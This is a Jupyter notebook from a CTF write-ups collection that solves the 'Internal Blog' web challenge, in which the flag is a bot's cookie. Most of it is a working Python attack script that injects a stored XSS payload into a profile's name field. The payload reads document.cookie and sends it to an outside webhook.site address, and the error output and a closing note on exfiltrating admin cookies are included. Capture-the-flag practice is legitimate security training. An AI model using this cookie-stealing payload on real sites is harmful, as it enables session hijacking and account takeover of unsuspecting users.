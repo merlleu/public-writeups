{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Internal Blog\n",
    "\n",
    "You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific...\n",
    "\n",
    "The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot's cookie."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Observations:\n",
    "\n",
    "We see on homepage that the code to detect xss is executed after the user is created in DB.\n",
    "We should be able to create a user with xss payload in the username and then just post a blog with our created user so that the admin loads our xss."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Creating profile for user {'token': '211abf30-1714-4226-b70c-450db91674ed', 'id': 'c1b7b740-d3b0-4c30-b9d2-a922741ef104', 'username': 'f12d6842', 'name': '\\n<script>\\n    const params = new FormData();\\n    params.append(\"location\", document.location.href);\\n    params.append(\"cookie\", document.cookie);\\n\\n    document.location = \"https://webhook.site/85425413-cb7b-414e-9dca-7884b92e8591?\" + new URLSearchParams(params);\\n</script>\\n', 'description': 'Just a chill guy', 'place': 'Paris', 'isVerified': True}\n",
      "XSS detected !!!!!\n"
     ]
    },
    {
     "ename": "HTTPError",
     "evalue": "500 Server Error: Internal Server Error for url: http://challenges.hackday.fr:61394/profile",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mHTTPError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[1], line 46\u001b[0m\n\u001b[0;32m     44\u001b[0m     r\u001b[38;5;241m.\u001b[39mraise_for_status()\n\u001b[0;32m     45\u001b[0m     \u001b[38;5;28;01mreturn\u001b[39;00m r\u001b[38;5;241m.\u001b[39mtext\n\u001b[1;32m---> 46\u001b[0m p \u001b[38;5;241m=\u001b[39m \u001b[43mcreate_profile\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m     48\u001b[0m \u001b[38;5;28mprint\u001b[39m(fetch_user_page(p[\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mtoken\u001b[39m\u001b[38;5;124m\"\u001b[39m]))\n",
      "Cell \u001b[1;32mIn[1], line 39\u001b[0m, in \u001b[0;36mcreate_profile\u001b[1;34m()\u001b[0m\n\u001b[0;32m     37\u001b[0m r \u001b[38;5;241m=\u001b[39m sess\u001b[38;5;241m.\u001b[39mpost(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mhttp://challenges.hackday.fr:61394/profile\u001b[39m\u001b[38;5;124m\"\u001b[39m, data\u001b[38;5;241m=\u001b[39mdata)\n\u001b[0;32m     38\u001b[0m \u001b[38;5;28mprint\u001b[39m(r\u001b[38;5;241m.\u001b[39mtext)\n\u001b[1;32m---> 39\u001b[0m \u001b[43mr\u001b[49m\u001b[38;5;241;43m.\u001b[39;49m\u001b[43mraise_for_status\u001b[49m\u001b[43m(\u001b[49m\u001b[43m)\u001b[49m\n\u001b[0;32m     40\u001b[0m \u001b[38;5;28;01mreturn\u001b[39;00m data\n",
      "File \u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python312\\site-packages\\requests\\models.py:1024\u001b[0m, in \u001b[0;36mResponse.raise_for_status\u001b[1;34m(self)\u001b[0m\n\u001b[0;32m   1019\u001b[0m     http_error_msg \u001b[38;5;241m=\u001b[39m (\n\u001b[0;32m   1020\u001b[0m         \u001b[38;5;124mf\u001b[39m\u001b[38;5;124m\"\u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39mstatus_code\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m Server Error: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00mreason\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m for url: \u001b[39m\u001b[38;5;132;01m{\u001b[39;00m\u001b[38;5;28mself\u001b[39m\u001b[38;5;241m.\u001b[39murl\u001b[38;5;132;01m}\u001b[39;00m\u001b[38;5;124m\"\u001b[39m\n\u001b[0;32m   1021\u001b[0m     )\n\u001b[0;32m   1023\u001b[0m \u001b[38;5;28;01mif\u001b[39;00m http_error_msg:\n\u001b[1;32m-> 1024\u001b[0m     \u001b[38;5;28;01mraise\u001b[39;00m HTTPError(http_error_msg, response\u001b[38;5;241m=\u001b[39m\u001b[38;5;28mself\u001b[39m)\n",
      "\u001b[1;31mHTTPError\u001b[0m: 500 Server Error: Internal Server Error for url: http://challenges.hackday.fr:61394/profile"
     ]
    }
   ],
   "source": [
    "import requests, bs4, uuid\n",
    "\n",
    "sess = requests.Session()\n",
    "def fetch_profile_creation_page():\n",
    "    r = sess.get(\"http://challenges.hackday.fr:61394/profile\")\n",
    "    r.raise_for_status()\n",
    "    bs = bs4.BeautifulSoup(r.text, \"html.parser\")\n",
    "    token_value = bs.find(\"p\", id=\"token-value\").text\n",
    "    contact_id = bs.find(\"input\", id=\"id\").get(\"value\")\n",
    "    return {\n",
    "        \"token\": token_value,\n",
    "        \"id\": contact_id\n",
    "    }\n",
    "\n",
    "SCRIPT_PAYLOAD = \"\"\"\n",
    "<script>\n",
    "    const params = new FormData();\n",
    "    params.append(\"location\", document.location.href);\n",
    "    params.append(\"cookie\", document.cookie);\n",
    "\n",
    "    document.location = \"https://webhook.site/85425413-cb7b-414e-9dca-7884b92e8591?\" + new URLSearchParams(params);\n",
    "</script>\n",
    "\"\"\"\n",
    "\n",
    "def create_profile():\n",
    "    data = fetch_profile_creation_page()\n",
    "    username = uuid.uuid4().hex[:8]\n",
    "    data.update({\n",
    "        \"username\": username,\n",
    "        \"name\": SCRIPT_PAYLOAD,\n",
    "        \"description\": \"Just a chill guy\",\n",
    "        \"place\": \"Paris\",\n",
    "        \"isVerified\": True\n",
    "    })\n",
    "\n",
    "    print(\"Creating profile for user\", data)\n",
    "    r = sess.post(\"http://challenges.hackday.fr:61394/profile\", data=data)\n",
    "    print(r.text)\n",
    "    r.raise_for_status()\n",
    "    return data\n",
    "\n",
    "def fetch_user_page(token):\n",
    "    r = sess.get(\"http://challenges.hackday.fr:61394/user?token={}\".format(token))\n",
    "    r.raise_for_status()\n",
    "    return r.text\n",
    "p = create_profile()\n",
    "\n",
    "print(fetch_user_page(p[\"token\"]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now you just have to create a post using your created token and admin cookies will be exfiltrated."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
